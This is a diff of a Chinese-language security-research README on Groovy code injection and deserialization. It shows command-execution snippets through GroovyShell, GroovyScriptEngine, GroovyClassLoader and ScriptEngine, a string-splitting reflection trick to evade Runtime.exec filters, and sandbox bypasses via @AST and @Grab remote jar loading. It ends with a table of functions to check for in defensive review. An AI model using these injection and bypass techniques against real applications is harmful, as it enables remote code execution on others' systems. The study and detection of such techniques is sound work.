@@ -2,6 +2,8 @@
 
 - Groovy_POC.java
 
+  **Groovy : 1.7.0-2.4.3**
+  
   ```java
   AnnotationInvocationHandler.readObject()
       Map.entrySet() (Proxy)
@@ -13,9 +15,13 @@
 
 ## 代码注入
 
+### 条件
+
 如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE
 
-![image-20220419175302032](image-20220419175302032.png)
+### 多种命令执行方法
+
+![image-20220419175302032](README/image-20220419175302032.png)
 
 运行这样一个Groovy代码，将会弹出一个计算器，成功执行了命令(def是用来定义标识符)
 
@@ -36,11 +42,13 @@ def cmd = "whoami";
 println "${cmd.execute().text}"
 ```
 
-### MethodClosure
+### 注入点分析
+
+#### MethodClosure
 
 看看他的构造方法
 
-![image-20220419213413728](image-20220419213413728.png)
+![image-20220419213413728](README/image-20220419213413728.png)
 
 可以发现他传入了一个对象，第二个是对象的方法，通过其中的docall方法进行调用
 
@@ -61,9 +69,9 @@ public class GroovyInject {
 }
 ```
 
-### GroovyShell
+#### GroovyShell
 
-类中的`evaluate`方法有多个重载，支持有`GroovyCodeSource String File URI 等参数类型，能够通过Groovy代码写入或者本地加载或者远程加载Groovy脚本来执行命令
+类中的`evaluate`方法有多个重载，支持有`GroovyCodeSource String File URI` 等参数类型，能够通过Groovy代码写入或者本地加载或者远程加载Groovy脚本来执行命令
 
 其中的`parse`方法就是或者对应的Groovy脚本，之后调用run方法进行执行代码内容
 
@@ -91,11 +99,11 @@ shell.evaluate(new URI("http://127.0.0.1:8888/GroovyTest.groovy"));
 
 这里的url和Groovy代码同样可以通过GroovyCodeSource封装之后执行`evalute`执行代码
 
-### GroovyScriptEngine
+#### GroovyScriptEngine
 
 GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们
 
-其构造方法存在重载的方式，可以指定远程Url/根文件位置/ClassLoader
+其构造方法存在重载的方式，可以指定远程`Url/根文件位置/ClassLoader`
 
 之后通过使用run方法回显，有两个重载，一个是传入脚本名和对应的参数，另一个是脚本名和Binding对象
 
@@ -117,7 +125,7 @@ GroovyScriptEngine scriptEngine = new GroovyScriptEngine("");
 scriptEngine.run("src/main/java/ysoserial/vulndemo/GroovyTest.groovy", new Binding());
 ```
 
-### GroovyClassLoader
+#### GroovyClassLoader
 
 GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类，重写了loadClass和defineClass方法
 
@@ -144,7 +152,7 @@ GroovyObject groovyObject = (GroovyObject) aClass.newInstance();
 groovyObject.invokeMethod("main", "");
 ```
 
-### ScriptEngine
+#### ScriptEngine
 
 在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的
 
@@ -157,11 +165,21 @@ System.out.println(scriptEngine.eval("\"whoami\".execute().text"));
 
 #### 反射+字符串拼接
 
+```java
+import java.lang.reflect.Method;
+Class<?> rt = Class.forName("java.la" + "ng.Run" + "time");
+Method gr = rt.getMethod("getR" + "untime");
+Method ex = rt.getMethod("ex" + "ec", String.class);
+ex.invoke(gr.invoke(null), "ca" + "lc")
+```
+
 #### Groovy沙箱绕过
 
 Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了
 
 ##### @AST注解执行断言
+
+https://www.groovy-lang.org/metaprogramming.html#_available_ast_transformations
 
 利用AST注解能够执行断言从而实现代码执行
 
@@ -175,7 +193,21 @@ this.class.classLoader.parseClass("""
 """)
 ```
 
-![image-20220420165003323](image-20220420165003323.png)
+模拟受害者：
+
+```java
+package pers.groovy
+
+class TestScript {
+    static void main(String[] args) {
+        //加载恶意脚本
+        GroovyShell shell = new GroovyShell()
+        shell.parse(new File("E:\\Tomcatproject\\demo\\src\\main\\java\\pers\\groovy\\Test.groovy")).run();
+    }
+}
+```
+
+![image-20220420165003323](README/image-20220420165003323.png)
 
 ##### @Grab注解加载远程恶意类
 
@@ -207,7 +239,7 @@ this.class.classLoader.parseClass("""
 
 之后使用`processOtherServices`方法处理其他服务，比如这里的name
 
-![image-20220420201627587](image-20220420201627587.png)
+![image-20220420201627587](README/image-20220420201627587.png)
 
 我们就需要在服务器上编写一个恶意类
 
@@ -235,3 +267,14 @@ mkdir -p group/module/version/
 mv module-version.jar group/module/version
 //之后开启http服务
 ```
+
+## 排查方法
+
+排查关键类函数特征：
+
+| 关键类                         | 关键函数   |
+| ------------------------------ | ---------- |
+| groovy.lang.GroovyShell        | evaluate   |
+| groovy.util.GroovyScriptEngine | run        |
+| groovy.lang.GroovyClassLoader  | parseClass |
+| javax.script.ScriptEngine      | eval       |
